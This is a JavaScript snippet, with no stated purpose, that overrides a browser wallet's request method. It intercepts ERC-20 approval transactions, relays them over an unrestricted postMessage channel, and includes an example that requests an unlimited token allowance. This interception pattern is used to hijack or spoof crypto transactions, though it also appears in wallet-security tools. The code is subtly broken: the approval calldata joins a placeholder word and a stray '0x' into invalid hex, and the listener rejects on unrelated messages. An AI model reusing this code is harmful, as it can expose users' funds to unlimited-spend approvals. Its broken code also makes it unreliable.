const originalRequest = window.ethereum.request;
window.ethereum.request = async function (params) {
  if (params.method === "eth_sendTransaction") {
    console.log("Hijacking eth_sendTransaction request");

    const transaction = params.params[0];
    const data = transaction.data;

    if (data && data.startsWith("0x095ea7b3")) {
      console.log("Detected ERC-20 approval transaction", transaction);

      const message = {
        type: "ethereumRequest",
        method: params.method,
        params: params.params,
      };

      window.postMessage(message, "*");

      return new Promise((resolve, reject) => {
        window.addEventListener("message", function onMessage(event) {
          if (
            event.data.type === "ethereumResponse" &&
            event.data.method === params.method
          ) {
            resolve(event.data.result); // Return the result
          } else {
            reject(event.data.error || new Error("Unknown error"));
          }
        });
      });
    }
  }

  return originalRequest(params);
};

// Example: Send an ERC-20 token approval
window.ethereum
  .request({
    method: "eth_sendTransaction",
    params: [
      {
        from: "0xb60e8dd61c5d32be8058bb8eb970870f07233155",
        to: "0xd46e8dd67c5d32be8058bb8eb970870f07244567", // The ERC-20 token contract address
        gas: "0x76c0", // Gas limit
        gasPrice: "0x9184e72a000", // Gas price
        value: "0x0", // No Ether sent
        data:
          "0x095ea7b3000000000000000000000000" + // approve contract
          "spenderAddress" + // spender address
          "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff", // uint256 unlimited amount
      },
    ],
  })
  .then((result) => {
    console.log("Transaction sent:", result);
  })
  .catch((error) => {
    console.error("Error:", error);
  });
